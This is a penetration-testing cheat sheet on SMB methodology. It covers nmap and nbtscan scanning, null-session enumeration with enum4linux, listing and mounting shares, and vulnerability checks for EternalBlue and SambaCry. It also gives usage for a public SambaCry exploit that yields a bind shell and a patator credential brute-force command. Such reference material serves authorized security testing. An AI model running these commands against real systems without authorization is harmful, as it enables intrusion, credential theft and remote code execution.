# SMB - Methodology

### Network scan

Nmap and nbtscan can be used to scan the network for SMB services:

```
nmap -v -p 139,445 -oA nmap_smb <RANGE/CIDR>
nbtscan -r <RANGE>
```

### Basic recon

The Nmap *smb-os-discovery.nse* script attempts to determine the operating
system, computer name, domain, workgroup, and current time over the SMB
protocol.

```
nmap --script smb-os-discovery.nse -p 445 <IP>
nmap -sU -sS --script smb-os-discovery.nse -p U:137,T:139 <IP>
```

### Null session

A null session refers to an unauthenticated NetBIOS session.  
A null session allows unauthenticated access to the shared files as well as a
large amounts of information about the machine, such as password policies,
usernames, group names, machine names, user and host SIDs.  
This Microsoft feature existed in SMB1 by default and was later restricted in
subsequent versions of SMB.  

To detect and retrieve information about the machine through a null session,
the enum4linux Perl script can be used:

```
enum4linux <TARGET>
```

Combine network scan and null session enumeration:

```
nbtscan -s ' ' <RANGE> | cut -d ' ' -f 1 | while read -r line ; do
  enum4linux $line > enum4linux_$line.txt
done
```

### List accessible shares

List the shares available on the server from Linux using smbclient.  
If no credentials are provided, a null session will be attempted.

```
smbmap [-d DOMAIN] [-u USERNAME] [-p PASSWORD/HASH] -L (-H HOST | --host-file FILE)  

smbclient -L <HOST>
smbclient -U <USER> -L <HOST>

nmap --script smb-enum-shares.nse -p 445 <HOST>
nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 <HOST>
```

### Search files

List the shares available on the server from Linux using smbclient.  
If no credentials are provided, a null session will be attempted.

```
smbmap [-d DOMAIN] [-u USERNAME] [-p PASSWORD/HASH] -F <PATTERN> (-H HOST | --host-file FILE)  

smbclient \\\\<HOST>\\<SHARE> -U <USER>
```

Smbmap can be used to download, upload or delete a file:

```
smbmap [-d DOMAIN] [-u USERNAME] [-p PASSWORD/HASH] --download/--upload/--delete <PATH> (-H HOST | --host-file FILE)  
```

The share may also be mounted using the Linux mount utility tool:

```
mount -t cifs -o username=<USER> //<HOST>//<SHARE> /mnt/<FOLDER>
mount -t cifs -o username=<USER>,password=<PASSWORD> //<HOST>//<SHARE> /mnt/<FOLDER>
```

### Check for known vulnerabilities

Nmap command can be used to check for the following exploits:

```
smb-vuln-ms08-067
smb-vuln-ms10-054
smb-vuln-ms10-061
smb-vuln-ms17-010 / cve-2017-7494
smb-vuln-regsvc-dos

nmap -v -p 139,445 --script=vuln <TARGET>
```

### EternalBlue & SambaCry

The Nmap *smb-vuln-ms17-010.nse* and *smb-vuln-cve-2017-7494* scripts attempt
to detect if a SMBv1 server is vulnerable to the remote code execution
vulnerability MS17-010, a.k.a. EternalBlue (vulnerability exploited by WannaCry
and Petya ransomware) or CVE-2017-7494 aka SambaCry.

```
# EternalBlue
nmap --script smb-vuln-ms17-010.nse -p 445 <IP>

# SambaCry
nmap --script smb-vuln-cve-2017-7494 -p 445 <IP>
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <IP>
```

If no share is available to unauthenticated users, the server may still be
vulnerable for authenticated users, meaning finding credentials would lead to
RCE.  
The following versions are vulnerable:

```
# EternalBlue
https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010

# SambaCry
Samba 3.x after 3.5.0 and 4.x before 4.4.14, 4.5.x before 4.5.10, and 4.6.x before 4.6.4
```

The following exploit may be used to achieve RCE through the SambaCry
vulnerability:

```
# Source
https://github.com/opsxcq/exploit-CVE-2017-7494

# Usage
exploit.py [-h] -t <TARGET> -e <EXECUTABLE> -s <REMOTESHARE> -r <REMOTEPATH> [-u <USER>] [-p <PASSWORD>] [-P <REMOTESHELLPORT>]

# The libbindshell-samba.so of the repository can be used to get a bind shell on the server :
# -e libbindshell-samba.so -r <SHARE>/libbindshell-samba.so
```

### Authentication brute force

The patator tool can be used to brute force credentials on the service:

```
patator smb_login host=<IP> user=FILE0 password=FILE1 0=<wordlist_user> 1=<wordlist_password> -x ignore:mesg='NT_STATUS_LOGON_FAILURE'
```
